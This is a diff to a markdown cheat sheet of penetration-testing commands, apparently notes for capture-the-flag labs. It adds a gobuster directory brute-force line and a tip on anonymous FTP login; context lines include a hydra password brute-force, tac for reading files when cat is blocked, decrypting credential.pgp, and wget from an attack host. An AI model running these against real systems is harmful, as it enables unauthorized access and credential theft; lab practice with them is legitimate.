@@ -37,6 +37,11 @@ hydra -l user -P passwords.txt ftp://<target-ip>
 dirb http://10.10.233.35/ /usr/share/wordlists/dirb/common.txt 
 ````
 
+# Gobuster basic command
+````shell
+gobuster dir -u http://10.10.70.124/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 60
+````
+
 # Tac for print and read files
 - Use the tool tac for printing files when cat, vi, vim... are blocked or not permitted:
 ````shell
@@ -62,4 +67,7 @@ gpg --decrypt credential.pgp
 ````shell
 wget http://<attack-ip>:8080/file
 ````
+
+# Login without password to FTP
+- User:  `anonymous`
 
